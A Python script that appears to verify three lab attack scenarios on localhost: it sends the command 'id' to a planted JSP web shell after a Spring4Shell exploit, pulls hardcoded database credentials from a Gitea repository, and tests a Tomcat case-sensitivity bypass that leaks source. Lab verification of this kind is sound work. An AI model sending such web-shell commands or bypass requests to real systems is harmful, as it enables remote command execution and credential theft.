import requests
import sys

# SL Cyber-Shield Technical Verifier (Automated Unit Tests)
# Purpose: Programmatic validation of the Big 3 attack scenarios for the technical audit.

BASE_SPRING = "http://localhost:8011"
BASE_GITEA = "http://localhost:3000"

def test_scenario1_rce():
    print("[*] Testing Scenario 1: Spring4Shell RCE Verification...")
    url = f"{BASE_SPRING}/yaho4.jsp?cmd=id"
    try:
        r = requests.get(url, timeout=5)
        if "uid=0(root)" in r.text:
            print("[+] PASS: Scenario 1 - Root RCE Confirmed.")
            return True
        else:
            print("[-] FAIL: Scenario 1 - Root RCE not detected in response.")
    except Exception as e:
        print(f"[!] Error: {e}")
    return False

def test_scenario2_creds():
    print("[*] Testing Scenario 2: Gitea Credential Exposure Verification...")
    # Checking the specific file identified in the visual hunt
    # Using the relative URL path in Gitea
    url = f"{BASE_GITEA}/test/struts-server/raw/branch/main/src/main/java/org/sphan/vuln/EmployeeRepository.java"
    try:
        r = requests.get(url, timeout=5)
        if "struts_pass" in r.text or "struts_user" in r.text:
            print("[+] PASS: Scenario 2 - Hardcoded Credentials Found in Gitea.")
            return True
        else:
            print("[-] FAIL: Scenario 2 - Credentials not found in target file.")
            # Debug: print sample content
            # print(r.text[:100])
    except Exception as e:
        print(f"[!] Error: {e}")
    return False

def test_scenario3_bypass():
    print("[*] Testing Scenario 3: Tomcat Case-Sensitivity Bypass Verification...")
    url = f"{BASE_SPRING}/YAHO4.JSP" # Capitalized extension bypass
    try:
        r = requests.get(url, timeout=5)
        # If it shows raw JSP tags, the bypass is successful (Source code leak)
        if "<%" in r.text and "java.lang.Runtime" in r.text:
            print("[+] PASS: Scenario 3 - Source Code Leak via Bypass Confirmed.")
            return True
        else:
            print("[-] FAIL: Scenario 3 - Bypass did not trigger source code leak.")
    except Exception as e:
        print(f"[!] Error: {e}")
    return False

def main():
    print("="*60)
    print(" SL Cyber-Shield: Automated Scenario Verifier (Unit Tests)")
    print("="*60)
    
    # Simple retry logic for container networking
    import time
    time.sleep(1) 

    results = [
        test_scenario1_rce(),
        test_scenario2_creds(),
        test_scenario3_bypass()
    ]
    
    print("="*60)
    print(f" FINAL STATUS: {sum(results)}/3 SCENARIOS VERIFIED ")
    print("="*60)
    
    if all(results):
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
